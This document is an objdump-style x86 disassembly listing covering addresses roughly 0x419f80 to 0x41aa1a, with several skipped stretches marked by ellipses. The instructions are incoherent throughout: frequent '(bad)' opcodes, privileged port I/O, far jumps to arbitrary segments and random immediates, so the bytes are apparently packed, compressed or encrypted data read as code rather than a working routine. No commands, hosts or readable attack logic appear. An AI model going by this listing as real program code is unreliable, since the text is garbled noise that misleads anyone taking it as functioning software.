  419f80:	shr    DWORD PTR [ebp-0x2b],0xa3
  419f84:	push   edx
  419f85:	xchg   ecx,eax
  419f86:	gs mov ecx,0xcda5ed8f
  419f8c:	outs   dx,BYTE PTR ds:[esi]
  419f8d:	jne    0x419fa9
  419f8f:	pushf  
  419f90:	fnstcw WORD PTR ds:0x7c3633f3
  419f96:	jge    0x419f4b
  419f98:	add    esi,edx
  419f9a:	push   ss
  419f9b:	ret    
  419f9c:	jno    0x419f71
  419f9e:	retf   
  419f9f:	mov    edx,0x5b98f392
  419fa4:	das    
  419fa5:	(bad)  
  419fa6:	fs push ebp
  419fa8:	(bad)  
  419fa9:	xchg   edx,eax
  419faa:	xor    al,cl
  419fac:	jg     0x419f79
  419fae:	sub    ch,BYTE PTR [edi-0x4b]
  419fb1:	stos   DWORD PTR es:[edi],eax
  419fb2:	mov    esi,0x8c748d68
  419fb7:	fisub  WORD PTR [ebp+0x341c024f]
  419fbd:	adc    edx,DWORD PTR [edi-0x7d442a0]
  419fc3:	test   al,0x48
  419fc5:	aaa    
  419fc6:	pop    es
  419fc7:	cmp    DWORD PTR [edi+eiz*2+0x6d26c9e1],edx
  419fce:	jmp    0x419f98
  419fd0:	jmp    DWORD PTR [edi+0x7e33d04e]
  419fd6:	add    eax,0xb4202262
  419fdb:	cld    
  419fdc:	pusha  
  419fdd:	int    0x5b
  419fdf:	adc    eax,0x8edead3b
  419fe4:	sub    al,0xc6
  419fe6:	pop    ss
  419fe7:	lds    esp,FWORD PTR ds:0x24f51091
  419fed:	lds    edi,FWORD PTR [ecx+0x1]
  419ff0:	mov    ch,0x9d
  419ff2:	push   ss
  419ff3:	cld    
  419ff4:	ja     0x419f82
  419ff6:	jnp    0x419fca
  419ff8:	shr    ch,0x95
  419ffb:	cmc    
  419ffc:	ret    
  419ffd:	mov    edx,0x3aea095c
  41a002:	pushf  
  41a003:	pop    ebx
  41a004:	sar    BYTE PTR [edi+0x4dc9b2ee],0xa1
  41a00b:	sahf   
  41a00c:	lea    esp,[esi+0x6ba53de3]
  41a012:	pop    ebp
  41a013:	mov    al,0x62
  41a015:	ins    DWORD PTR es:[edi],dx
  41a016:	jg     0x41a005
  41a018:	mov    dh,0x57
  41a01a:	pop    eax
  41a01b:	aaa    
  41a01c:	pop    ebp
  41a01d:	push   cs
  41a01e:	test   DWORD PTR [ebx-0x43],ebp
  41a021:	xchg   edi,eax
  41a022:	rol    BYTE PTR [edi],0x78
  41a025:	xchg   esi,eax
  41a026:	jo     0x41a020
  41a028:	test   DWORD PTR [edx+0x732df742],ecx
  41a02e:	pop    ss
  41a02f:	out    0x98,eax
  41a031:	mov    BYTE PTR [ecx-0x51],dh
  41a034:	jbe    0x41a09b
  41a036:	mov    DWORD PTR [edx+ebx*4],eax
  41a039:	push   esi
  41a03a:	xor    al,0xdb
  41a03c:	and    BYTE PTR ds:0x4b076dc6,0x0
	...
  41a0b3:	add    BYTE PTR [edi-0x41bd617b],ch
  41a0b9:	pop    ebx
  41a0ba:	(bad)  
  41a0bb:	in     eax,dx
  41a0bc:	(bad)  ds:0x1adf04a2
  41a0c2:	xlat   BYTE PTR ds:[ebx]
  41a0c3:	adc    DWORD PTR [esi+0x1a],esp
  41a0c6:	add    DWORD PTR [eax],eax
  41a0c8:	test   BYTE PTR [eax],0x0
  41a0cb:	add    BYTE PTR [esi+ebx*1],al
  41a0ce:	ds mov ecx,0x9675fd86
  41a0d4:	jge    0x41a130
  41a0d6:	nop
  41a0d7:	pop    eax
  41a0d8:	iret   
  41a0d9:	icebp  
  41a0da:	adc    DWORD PTR ds:0xfb1c96c0,edx
  41a0e0:	xchg   ecx,eax
  41a0e1:	xor    al,0x40
  41a0e3:	push   ds
  41a0e4:	jg     0x41a0d8
  41a0e6:	jo     0x41a156
  41a0e8:	xor    al,0x3e
  41a0ea:	mov    esi,DWORD PTR [esi-0x60]
  41a0ed:	test   al,0x2
  41a0ef:	or     esi,DWORD PTR fs:[ebx]
  41a0f2:	daa    
  41a0f3:	or     eax,0x7c486cee
  41a0f8:	les    esp,FWORD PTR [edi+0x2644c93e]
  41a0fe:	hlt    
  41a0ff:	ss ds push 0x38214a8c
  41a106:	dec    eax
  41a107:	js     0x41a14a
  41a109:	xchg   DWORD PTR [ebx-0x61872f78],esi
  41a10f:	int3   
  41a110:	adc    eax,0xe4411509
  41a115:	cmc    
  41a116:	imul   ebx,DWORD PTR [edx],0xffffffe3
  41a119:	or     DWORD PTR ds:0x4f6ca2ea,ecx
  41a11f:	loop   0x41a0b3
  41a121:	stc    
  41a122:	push   ebp
  41a123:	xchg   ecx,eax
  41a124:	xchg   ebp,eax
  41a125:	inc    ebp
  41a126:	cwde   
  41a127:	in     eax,dx
  41a128:	inc    edx
  41a129:	xchg   edi,edx
  41a12b:	out    0x4c,al
  41a12d:	test   BYTE PTR [esi-0x52],0xcf
  41a131:	es gs sub eax,0x847ef83a
  41a138:	xor    BYTE PTR [eax-0x22],bl
  41a13b:	jns    0x41a102
  41a13d:	sbb    ebx,DWORD PTR [ebx+0x4e]
  41a140:	or     esi,edi
  41a142:	stos   DWORD PTR es:[edi],eax
  41a143:	push   eax
  41a144:	cmp    ch,BYTE PTR [ebx]
  41a146:	loopne 0x41a151
  41a148:	jle    0x41a123
  41a14a:	(bad)  
  41a14b:	idiv   DWORD PTR [eax]
  41a14d:	mov    ds:0x9187616e,al
  41a152:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a153:	jns    0x41a130
  41a155:	or     bh,dl
  41a157:	in     eax,0xad
  41a159:	jge    0x41a111
  41a15b:	in     eax,0xe5
  41a15d:	cmp    BYTE PTR [ebx+0x7c],ch
  41a160:	mov    dl,0x9c
  41a162:	cmp    BYTE PTR [ecx+0x4b],ah
  41a165:	xor    dh,BYTE PTR [ebp-0x3fa99138]
  41a16b:	mov    dh,0x4c
  41a16d:	das    
  41a16e:	out    0x81,eax
  41a170:	test   al,0xdc
  41a172:	push   edi
  41a173:	es xor bl,dh
  41a176:	jb     0x41a187
  41a178:	add    eax,0x3eed1cb0
  41a17d:	dec    ebx
  41a17e:	or     eax,0xeb181f23
  41a183:	xchg   DWORD PTR [edi],ecx
  41a185:	inc    ecx
  41a186:	repnz popf 
  41a188:	iret   
  41a189:	rol    ebp,0xb5
  41a18c:	lods   eax,DWORD PTR ds:[esi]
  41a18d:	stos   BYTE PTR es:[edi],al
  41a18e:	(bad)  
  41a18f:	and    esi,eax
  41a191:	pop    ebp
  41a192:	daa    
  41a193:	adc    DWORD PTR [ebp-0x34aa024f],esi
  41a199:	push   edi
  41a19a:	jge    0x41a217
  41a19c:	inc    ebp
  41a19d:	push   ds
  41a19e:	jmp    FWORD PTR [esi-0xc39cde1]
  41a1a4:	aam    0x54
  41a1a6:	mov    ebp,0xba541567
  41a1ab:	dec    edx
  41a1ac:	mov    eax,0x292b78ab
  41a1b1:	nop
  41a1b2:	in     al,dx
  41a1b3:	cmp    al,0x76
  41a1b5:	dec    esi
  41a1b6:	add    eax,0x27780ad6
  41a1bb:	pop    ss
  41a1bc:	sbb    al,0x23
  41a1be:	shr    BYTE PTR [edx+0xd59],1
	...
  41a234:	mov    al,ds:0xff33bae7
  41a239:	jg     0x41a1e4
  41a23b:	imul   DWORD PTR [esi+eiz*4]
  41a23e:	push   edi
  41a23f:	test   BYTE PTR [edx],0x7b
  41a242:	lds    ecx,FWORD PTR [esp+ebx*2]
  41a245:	sbb    eax,DWORD PTR [ecx]
  41a247:	add    dh,dh
  41a249:	add    BYTE PTR [eax],al
  41a24b:	add    ah,cl
  41a24d:	mov    ds:0xcbac2604,al
  41a252:	cdq    
  41a253:	data16 add al,0x91
  41a256:	fwait
  41a257:	clc    
  41a258:	arpl   cx,ax
  41a25a:	and    al,0xd
  41a25c:	js     0x41a273
  41a25e:	icebp  
  41a25f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a260:	fnstenv [esi]
  41a262:	xchg   esp,eax
  41a263:	mov    ah,0xac
  41a265:	xor    DWORD PTR [ecx-0x3d5e10ae],ebp
  41a26b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a26c:	cmp    BYTE PTR [ebp+ebx*2-0x7d30c716],0xb5
  41a274:	dec    ebx
  41a275:	mov    ebx,0x1adc73a5
  41a27a:	inc    edx
  41a27b:	push   0x89398a0f
  41a280:	enter  0x4f66,0x26
  41a284:	mov    ebp,0x9a49c232
  41a289:	pop    ebp
  41a28a:	mov    edi,0xe0a9368
  41a28f:	es cmp esi,ecx
  41a292:	sahf   
  41a293:	and    BYTE PTR [ebx+0x65],dl
  41a296:	mov    dh,0x41
  41a298:	test   DWORD PTR [eax],edx
  41a29a:	push   edx
  41a29b:	and    cl,BYTE PTR [ebx+0x1aeae4b5]
  41a2a1:	faddp  st(2),st
  41a2a3:	sar    DWORD PTR [ecx],cl
  41a2a5:	or     eax,DWORD PTR [ebp-0x58]
  41a2a8:	mov    dl,0x42
  41a2aa:	pop    eax
  41a2ab:	xchg   ecx,eax
  41a2ac:	popf   
  41a2ad:	or     al,0x5
  41a2af:	enter  0xd554,0xb1
  41a2b3:	mov    ds:0x45aab11f,al
  41a2b8:	or     BYTE PTR [edx+0x79caedfb],al
  41a2be:	jae    0x41a287
  41a2c0:	ret    
  41a2c1:	in     eax,dx
  41a2c2:	cmp    BYTE PTR [esi],0xe7
  41a2c5:	jae    0x41a267
  41a2c7:	iret   
  41a2c8:	(bad)  
  41a2c9:	stc    
  41a2ca:	mov    ebp,0x286a2bb5
  41a2d0:	push   ebp
  41a2d1:	ins    DWORD PTR es:[edi],dx
  41a2d2:	xor    DWORD PTR [ecx+edx*4-0x1e52b2e6],ebx
  41a2d9:	dec    ebx
  41a2da:	jbe    0x41a2c3
  41a2dc:	pop    esp
  41a2de:	or     DWORD PTR [ebp+0x23],esi
  41a2e1:	or     BYTE PTR [edi],0xd7
  41a2e4:	add    DWORD PTR [esi-0x48e4906c],ebp
  41a2ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a2eb:	sub    esp,DWORD PTR [eax]
  41a2ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a2ee:	fsub   QWORD PTR [edx]
  41a2f0:	jo     0x41a299
  41a2f2:	adc    bl,BYTE PTR [ebx+ebx*2-0x713143ec]
  41a2f9:	jbe    0x41a2d8
  41a2fb:	dec    edi
  41a2fc:	adc    eax,0xae7fbf3f
  41a301:	pop    ebp
  41a302:	sub    edi,DWORD PTR [ebx]
  41a304:	adc    DWORD PTR [edi],eax
  41a306:	pushf  
  41a307:	retf   
  41a308:	pop    esi
  41a309:	pop    ds
  41a30a:	inc    ecx
  41a30b:	scas   eax,DWORD PTR es:[edi]
  41a30c:	idiv   DWORD PTR [ebx-0x61fcd8ca]
  41a312:	psrad  mm4,QWORD PTR [edx]
  41a315:	cdq    
  41a316:	fisttp WORD PTR [edx-0x67]
  41a319:	mov    eax,0x8dc43574
  41a31e:	mov    al,ds:0x1d9d4200
  41a323:	xchg   ebx,eax
  41a324:	adc    eax,0x1cbebf0d
  41a329:	outs   dx,DWORD PTR ds:[esi]
  41a32a:	out    0xa7,eax
  41a32c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a32d:	mov    eax,0xdaefe588
  41a332:	jne    0x41a382
  41a334:	jno    0x41a33a
  41a336:	mov    bh,0xa0
  41a338:	sub    DWORD PTR [ebx-0x2883b71e],ebx
  41a33e:	sbb    al,0xc5
  41a340:	or     al,0xd3
	...
  41a3b2:	add    BYTE PTR [eax],al
  41a3b4:	cmp    eax,0xed3a6998
  41a3b9:	sti    
  41a3ba:	jg     0x41a35b
  41a3bc:	and    DWORD PTR [esi+edx*4+0x6a],ebp
  41a3c0:	repz xor BYTE PTR [ecx+ebp*2+0x11c52],dl
  41a3c8:	test   BYTE PTR [eax],0x0
  41a3cb:	add    ah,ch
  41a3cd:	fisttp WORD PTR [edi+0x1b0f2ff]
  41a3d3:	cwde   
  41a3d4:	jo     0x41a3f4
  41a3d6:	into   
  41a3d7:	repz sar ch,cl
  41a3da:	fisttp DWORD PTR [edi+0xc]
  41a3dd:	out    dx,al
  41a3de:	mov    ds:0x930f796a,al
  41a3e3:	inc    edi
  41a3e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a3e5:	cdq    
  41a3e6:	cmp    DWORD PTR [ebp+eax*4-0x6a],ecx
  41a3ea:	xchg   DWORD PTR [esi-0x4db4e44f],eax
  41a3f0:	sbb    BYTE PTR [esi+eax*2+0x5],0x6a
  41a3f5:	mov    bh,0x1b
  41a3f7:	ret    0x12f1
  41a3fa:	mov    ebx,0x76508b26
  41a3ff:	aad    0xa9
  41a401:	cmp    dl,BYTE PTR [ecx-0x4211c50a]
  41a407:	add    edi,esi
  41a409:	lods   eax,DWORD PTR ds:[esi]
  41a40a:	fcmovne st,st(7)
  41a40c:	mov    dl,0x89
  41a40e:	sahf   
  41a40f:	xchg   BYTE PTR [edx+0x41126f67],ah
  41a415:	mov    eax,ds:0x652ed835
  41a41a:	stos   DWORD PTR es:[edi],eax
  41a41b:	push   es
  41a41c:	sbb    al,0x5d
  41a41e:	out    dx,al
  41a41f:	pusha  
  41a420:	vmovhpd xmm1,xmm5,QWORD PTR [ebx+edx*8]
  41a425:	test   al,0xe
  41a427:	sti    
  41a428:	jb     0x41a3cf
  41a42a:	xor    DWORD PTR [eax],esi
  41a42c:	out    0xde,eax
  41a42e:	(bad)
  41a432:	inc    ebp
  41a433:	and    eax,0x46f1a5e4
  41a438:	(bad)  
  41a439:	(bad)  
  41a43a:	xchg   ebx,eax
  41a43b:	xlat   BYTE PTR ds:[ebx]
  41a43c:	cld    
  41a43d:	adc    BYTE PTR [edi],0x17
  41a440:	iret   
  41a441:	jge    0x41a484
  41a443:	jne    0x39683afd
  41a449:	and    edi,ecx
  41a44b:	push   eax
  41a44c:	cmc    
  41a44d:	xchg   ebx,eax
  41a44e:	cwde   
  41a44f:	std    
  41a450:	cmp    al,0xc8
  41a452:	out    0xb7,al
  41a454:	xor    al,0x42
  41a456:	ins    DWORD PTR es:[edi],dx
  41a457:	leave  
  41a458:	cmp    cl,dl
  41a45a:	jmp    0x8c144d7d
  41a45f:	call   0x812:0x7c396f1d
  41a466:	push   ds
  41a467:	pop    ss
  41a468:	lahf   
  41a469:	ss xchg edi,eax
  41a46b:	mov    edi,edx
  41a46d:	cwde   
  41a46e:	dec    edi
  41a46f:	xor    cl,ah
  41a471:	fmul   DWORD PTR [ebp+eax*4+0x5a]
  41a475:	cmp    eax,0xc4f85922
  41a47a:	push   es
  41a47b:	mov    bh,BYTE PTR [edx+0x6b]
  41a47e:	dec    esp
  41a47f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a480:	jb     0x41a47c
  41a482:	test   DWORD PTR [edx-0x516684e2],0xa3aeba47
  41a48c:	pop    es
  41a48d:	mov    dl,0xe7
  41a48f:	jmp    0xbcb3:0xf6246841
  41a496:	inc    ebp
  41a497:	push   ebx
  41a498:	add    al,0xa2
  41a49a:	ret    
  41a49b:	jb     0x41a435
  41a49d:	data16 faddp st(5),st
  41a4a0:	mov    dh,BYTE PTR [eax-0x73]
  41a4a3:	jb     0x41a466
  41a4a5:	loop   0x41a4b7
  41a4a7:	in     al,dx
  41a4a8:	iret   
  41a4a9:	cmp    eax,0x35e60a45
  41a4ae:	push   edi
  41a4af:	mov    eax,0x48efccff
  41a4b4:	(bad)  
  41a4b5:	push   ebx
  41a4b6:	add    DWORD PTR [esi-0x43376ba9],edx
  41a4bc:	lahf   
  41a4bd:	int3   
  41a4be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a4bf:	nop
  41a4c0:	mov    dl,0xa
	...
  41a532:	add    BYTE PTR [eax],al
  41a534:	scas   eax,DWORD PTR es:[edi]
  41a535:	aam    0x8d
  41a537:	(bad)  
  41a538:	(bad)  
  41a539:	jnp    0x41a52a
  41a53b:	fld    QWORD PTR [eax+0x1fe9e0aa]
  41a541:	xchg   edi,eax
  41a542:	je     0x41a4e6
  41a544:	dec    eax
  41a545:	sbb    eax,0xf60001
  41a54a:	add    BYTE PTR [eax],al
  41a54c:	jne    0x41a5bd
  41a54e:	push   edx
  41a54f:	scas   eax,DWORD PTR es:[edi]
  41a550:	xchg   ebp,eax
  41a551:	pop    edx
  41a552:	rcl    BYTE PTR [eax+0x32242cee],1
  41a558:	pop    edi
  41a559:	push   0x69
  41a55b:	es push ebx
  41a55d:	fcmovnbe st,st(4)
  41a55f:	ds aas 
  41a561:	inc    ebx
  41a562:	data16 arpl WORD PTR [edi-0x14],bx
  41a566:	cmp    DWORD PTR [ebp+0x55291d30],ebx
  41a56c:	shl    eax,0xf9
  41a56f:	(bad)  
  41a570:	stc    
  41a571:	push   0x3f154a0d
  41a576:	iret   
  41a577:	lods   al,BYTE PTR ds:[esi]
  41a578:	cmp    ecx,DWORD PTR [esi]
  41a57a:	xor    al,0xd3
  41a57c:	sbb    BYTE PTR ss:[edi-0x594c815],al
  41a583:	cmp    ah,dl
  41a585:	add    ebp,edx
  41a587:	cdq    
  41a588:	adc    al,0xdb
  41a58a:	jle    0x41a50c
  41a58c:	sbb    al,bl
  41a58e:	sub    BYTE PTR [ebx-0x58a3914b],cl
  41a594:	fmul   DWORD PTR [ebx]
  41a596:	and    ebp,DWORD PTR [ebp+0x18]
  41a599:	mov    cx,0xcd03
  41a59d:	ficomp DWORD PTR [esi]
  41a59f:	sub    BYTE PTR [edi-0xa3ece1f],cl
  41a5a5:	inc    edx
  41a5a6:	add    dl,BYTE PTR [ecx]
  41a5a8:	popa   
  41a5a9:	stos   BYTE PTR es:[edi],al
  41a5aa:	xchg   edi,eax
  41a5ab:	mov    ebp,0x7e5c171d
  41a5b0:	jmp    0xaf6b:0x314f70db
  41a5b7:	(bad)  
  41a5b8:	jle    0x41a598
  41a5ba:	inc    esi
  41a5bb:	das    
  41a5bc:	ds xor ebx,esp
  41a5bf:	inc    ebx
  41a5c0:	arpl   WORD PTR [edx],bx
  41a5c2:	push   ds
  41a5c3:	imul   edx,eax,0xffffffe8
  41a5c6:	ror    BYTE PTR [edi-0x41],1
  41a5c9:	not    DWORD PTR [edi]
  41a5cb:	fiadd  WORD PTR [edx-0x70]
  41a5ce:	sub    eax,DWORD PTR [ecx-0x68b4ab2e]
  41a5d4:	nop
  41a5d5:	push   ds
  41a5d6:	test   eax,0x87ffc611
  41a5db:	jno    0x41a5fa
  41a5dd:	mov    dh,0x9c
  41a5df:	cwde   
  41a5e0:	test   al,0xce
  41a5e2:	shl    edi,0x35
  41a5e5:	js     0x41a599
  41a5e7:	jae    0x41a592
  41a5e9:	or     eax,0x6bbc2800
  41a5ee:	adc    dl,BYTE PTR [edi-0x7d]
  41a5f1:	mov    ebp,0x76d013f4
  41a5f6:	iret   
  41a5f7:	out    0xa9,al
  41a5f9:	and    BYTE PTR [ebx-0x2e5c3173],ch
  41a5ff:	ret    
  41a600:	rcr    BYTE PTR [esi+0x2a],1
  41a603:	sbb    al,0xa0
  41a605:	and    ah,BYTE PTR [edx]
  41a607:	aas    
  41a608:	(bad)  
  41a609:	sbb    esp,ebx
  41a60b:	push   ebx
  41a60c:	out    0x83,eax
  41a60e:	sub    DWORD PTR [edx+0x44],edi
  41a611:	dec    ebp
  41a612:	add    ecx,edi
  41a614:	jmp    0x41a5d8
  41a616:	xlat   BYTE PTR ds:[ebx]
  41a617:	popa   
  41a618:	repnz push ebp
  41a61a:	(bad)  
  41a61b:	lods   eax,DWORD PTR ds:[esi]
  41a61c:	add    dh,BYTE PTR [ebx-0x80]
  41a61f:	mov    esi,0xb0782e78
  41a624:	scas   al,BYTE PTR es:[edi]
  41a625:	test   DWORD PTR [ebp+ecx*1-0x553ec193],eax
  41a62c:	pop    ds
  41a62d:	cwde   
  41a62e:	jle    0x41a67d
  41a630:	pop    edi
  41a631:	jg     0x41a698
  41a633:	sbb    ch,BYTE PTR [edx+ebp*2-0x1d260bcc]
  41a63a:	(bad)  
  41a63c:	pop    esp
  41a63d:	mov    bl,0x9d
  41a63f:	mov    DWORD PTR [ecx-0x2d],esp
	...
  41a6b2:	add    BYTE PTR [eax],al
  41a6b4:	mov    bl,0x3f
  41a6b6:	jno    0x41a71d
  41a6b8:	std    
  41a6b9:	outs   dx,DWORD PTR ds:[esi]
  41a6ba:	mov    bh,0xff
  41a6bc:	xchg   ecx,eax
  41a6bd:	pop    edx
  41a6be:	cdq    
  41a6bf:	mov    dl,0xfd
  41a6c1:	add    al,0x43
  41a6c3:	repz ds push ds
  41a6c6:	add    DWORD PTR [eax],eax
  41a6c8:	test   BYTE PTR [eax],0x0
  41a6cb:	add    dh,bl
  41a6cd:	scas   eax,DWORD PTR es:[edi]
  41a6ce:	jle    0x41a74c
  41a6d0:	call   0x47a:0xcf89a318
  41a6d7:	nop
  41a6d8:	pushf  
  41a6d9:	xchg   edi,eax
  41a6da:	mov    ds:0x378414e9,al
  41a6df:	rol    BYTE PTR [ebp+0x173bbbbe],0xfe
  41a6e6:	out    dx,eax
  41a6e7:	sub    eax,ecx
  41a6e9:	int    0xd4
  41a6eb:	cs sub ch,bh
  41a6ee:	jno    0x41a68f
  41a6f0:	sti    
  41a6f1:	or     edi,ebp
  41a6f3:	sub    bh,BYTE PTR [esi-0x23]
  41a6f6:	jne    0x41a6b3
  41a6f8:	cdq    
  41a6f9:	fcomp  DWORD PTR [edx-0x34]
  41a6fc:	jmp    0xf966:0x47414e3e
  41a703:	cmp    BYTE PTR [ecx],bh
  41a705:	sub    ecx,esp
  41a707:	jns    0x41a765
  41a709:	(bad)  
  41a70a:	int    0xda
  41a70c:	not    DWORD PTR [esi+ecx*2-0xe75b4c]
  41a713:	rcr    DWORD PTR [esi-0x1a],0x43
  41a717:	xchg   ebp,eax
  41a718:	xor    eax,0xa3fbc838
  41a71d:	ds mov bh,0xe5
  41a720:	mov    al,0x5f
  41a722:	or     bl,BYTE PTR ds:0x19f4c98b
  41a728:	cmp    al,0x99
  41a72a:	add    BYTE PTR [eax-0x626dd82a],cl
  41a730:	sub    ebp,DWORD PTR [edx+0x47722dd1]
  41a736:	leave  
  41a737:	fwait
  41a738:	dec    esi
  41a739:	mov    dh,0xa5
  41a73b:	or     eax,0xf3694f8c
  41a740:	add    esp,esi
  41a742:	push   ebx
  41a743:	and    dh,BYTE PTR [edi]
  41a745:	scas   eax,DWORD PTR es:[edi]
  41a746:	or     eax,0xe7f218b
  41a74b:	div    DWORD PTR [ebx-0x2b361f19]
  41a751:	cld    
  41a752:	push   ebp
  41a753:	push   0xa61496a4
  41a758:	imul   esp,DWORD PTR [ecx-0x5d58fb7f],0xc9719d0c
  41a762:	lahf   
  41a763:	mov    eax,ds:0x1beb44f5
  41a768:	xor    esp,ebx
  41a76a:	pop    ds
  41a76b:	ja     0x41a71e
  41a76d:	mov    edx,0x50e2c4e6
  41a772:	stos   BYTE PTR es:[edi],al
  41a773:	into   
  41a774:	scas   eax,DWORD PTR es:[edi]
  41a775:	xchg   ecx,eax
  41a776:	arpl   dx,di
  41a778:	popa   
  41a779:	mov    esp,0x9405df0e
  41a77e:	inc    ecx
  41a77f:	repnz lock shr BYTE PTR [esi+0x6e7bfc25],1
  41a787:	test   BYTE PTR cs:[esp],dh
  41a78b:	fwait
  41a78c:	ins    DWORD PTR es:[edi],dx
  41a78d:	mov    dl,0xc6
  41a78f:	push   eax
  41a790:	nop
  41a791:	mov    ebx,0x857c23b4
  41a796:	fwait
  41a797:	dec    ebx
  41a798:	push   ss
  41a799:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a79a:	and    edx,DWORD PTR [esp+ebp*2+0x6fc72be2]
  41a7a1:	retf   0xa795
  41a7a4:	fiadd  WORD PTR [ecx+eiz*8+0x76]
  41a7a8:	pushf  
  41a7a9:	lds    eax,FWORD PTR [edi]
  41a7ab:	fst    QWORD PTR [esi-0x2a53efd2]
  41a7b1:	test   eax,0x364ba79a
  41a7b6:	leave  
  41a7b7:	stos   DWORD PTR es:[edi],eax
  41a7b8:	ss out dx,eax
  41a7ba:	mov    ebx,0xb639e104
  41a7bf:	jp     0x41a759
  41a7c1:	add    BYTE PTR fs:[eax],al
	...
  41a834:	sbb    BYTE PTR [ecx],0x47
  41a837:	loope  0x41a818
  41a839:	jmp    DWORD PTR [esi-0xf626c85]
  41a83f:	loop   0x41a830
  41a841:	vpcmpeqw xmm6,xmm0,XMMWORD PTR [edi+ebx*1]
  41a846:	add    DWORD PTR [eax],eax
  41a848:	test   BYTE PTR [eax],0x0
  41a84b:	add    BYTE PTR [ebx],al
  41a84d:	stc    
  41a84e:	in     eax,0xb7
  41a850:	or     esi,0x7bc2cc4d
  41a856:	in     eax,0x38
  41a858:	imul   edi,ebp,0xffffffae
  41a85b:	mov    ebx,0xd07ebbdb
  41a860:	(bad)  
  41a861:	fisttp DWORD PTR [esi*1+0x162945c5]
  41a868:	loopne 0x41a89e
  41a86a:	cmp    eax,0x8db0a2d
  41a86f:	push   esp
  41a870:	cwde   
  41a871:	sub    eax,0x6d13e3a9
  41a876:	mov    ds:0x7b541946,eax
  41a87b:	ror    BYTE PTR [ebx+0xa67bb5d],0xe3
  41a882:	and    ecx,DWORD PTR ds:0x891d59d
  41a888:	or     al,0xa7
  41a88a:	out    0xeb,al
  41a88c:	jnp    0x41a82c
  41a88e:	ror    edi,cl
  41a890:	por    mm1,QWORD PTR [ecx+0x6]
  41a894:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a895:	add    BYTE PTR [edx],dh
  41a897:	lahf   
  41a898:	test   al,0x95
  41a89a:	mov    WORD PTR ds:[esi+0xc],cs
  41a89e:	adc    BYTE PTR [edx+0x4b52c314],bh
  41a8a4:	call   0xe7bd47ba
  41a8a9:	fld    st(6)
  41a8ab:	dec    eax
  41a8ac:	mov    ch,0x71
  41a8ae:	les    eax,FWORD PTR [ebx+0x4a]
  41a8b1:	test   eax,0xfb563a7a
  41a8b6:	xor    edx,DWORD PTR [ebp-0x19]
  41a8b9:	or     DWORD PTR [eax],ecx
  41a8bb:	sub    DWORD PTR [ebx],ecx
  41a8bd:	mov    al,0xea
  41a8bf:	mov    ecx,0xccd0d169
  41a8c4:	lea    ebp,[eax*4+0x66f78e0e]
  41a8cb:	lea    ebp,[esi+0x2c]
  41a8ce:	aaa    
  41a8cf:	into   
  41a8d0:	inc    esi
  41a8d1:	loope  0x41a902
  41a8d3:	mov    edx,0x6ed6b546
  41a8d8:	pop    esi
  41a8d9:	ret    0x10c9
  41a8dc:	push   es
  41a8dd:	int    0x1f
  41a8df:	pop    ds
  41a8e0:	or     edi,ecx
  41a8e2:	stos   DWORD PTR es:[edi],eax
  41a8e3:	xchg   ebp,eax
  41a8e4:	out    0x4f,al
  41a8e6:	jb     0x5812d33c
  41a8ec:	jmp    0xaa95:0xdfe60a2c
  41a8f3:	sub    eax,0x20fe6395
  41a8f8:	lock dec eax
  41a8fa:	dec    edi
  41a8fb:	jg     0x41a919
  41a8fd:	push   ecx
  41a8fe:	mov    ebx,0x546155c8
  41a903:	icebp  
  41a904:	xchg   BYTE PTR [edi+0x5],cl
  41a907:	jle    0x41a8b4
  41a909:	jmp    0x41a93c
  41a90b:	lds    eax,FWORD PTR [ebx]
  41a90d:	mov    edx,0xa2e0bdde
  41a912:	ror    DWORD PTR [ecx+0x4cc4ffaa],1
  41a918:	adc    edi,DWORD PTR [edx+edi*8-0x56d367ab]
  41a91f:	sti    
  41a920:	mov    ebp,0x583c396b
  41a925:	xchg   edi,eax
  41a926:	daa    
  41a927:	call   0xd7b8:0x4fbd2459
  41a92e:	mov    eax,0x1b859a52
  41a933:	or     eax,0x5499b173
  41a938:	push   esi
  41a939:	or     al,0x99
  41a93b:	ins    DWORD PTR es:[edi],dx
  41a93c:	aad    0xf5
  41a93e:	rol    BYTE PTR ds:0x1632,1
	...
  41a9b4:	xor    esi,DWORD PTR [ecx]
  41a9b6:	xchg   ebx,eax
  41a9b7:	lds    edx,FWORD PTR [ebx-0x46088819]
  41a9bd:	icebp  
  41a9be:	cmp    eax,0x5870b69e
  41a9c3:	sub    DWORD PTR [edx],0xf6000120
  41a9c9:	add    BYTE PTR [eax],al
  41a9cb:	add    BYTE PTR [edx-0x423856d8],bl
  41a9d1:	sbb    edx,0x27
  41a9d4:	out    0xed,eax
  41a9d6:	or     al,al
  41a9d8:	xor    ah,BYTE PTR [ecx+ebx*8-0x251ce6f0]
  41a9df:	or     DWORD PTR [ebx+0x2a9b1ad],esi
  41a9e5:	dec    esp
  41a9e6:	sbb    eax,edx
  41a9e8:	xchg   edi,eax
  41a9e9:	cmc    
  41a9ea:	in     al,0xf0
  41a9ec:	pop    ds
  41a9ed:	xlat   BYTE PTR ds:[ebx]
  41a9ee:	or     bl,BYTE PTR [eax]
  41a9f0:	and    edi,ebx
  41a9f2:	in     eax,dx
  41a9f3:	sbb    esi,esi
  41a9f5:	mov    ebp,DWORD PTR [edx]
  41a9f7:	sub    DWORD PTR [edx],0x66c5ef20
  41a9fd:	adc    esp,DWORD PTR [ebx+ebp*2+0x61]
  41aa01:	fwait
  41aa02:	outs   dx,BYTE PTR ds:[esi]
  41aa03:	shl    dh,1
  41aa05:	ror    DWORD PTR [edx],cl
  41aa07:	fxch   st(7)
  41aa09:	add    ch,BYTE PTR [ecx+0x3a]
  41aa0c:	xor    BYTE PTR [ebx],0xd4
  41aa0f:	das    
  41aa10:	mov    ebp,0x2db5570b
  41aa15:	jno    0x41aa6d
  41aa17:	lods   eax,DWORD PTR ds:[esi]
  41aa18:	jg     0x41aa84
  41aa1a:	pushf  
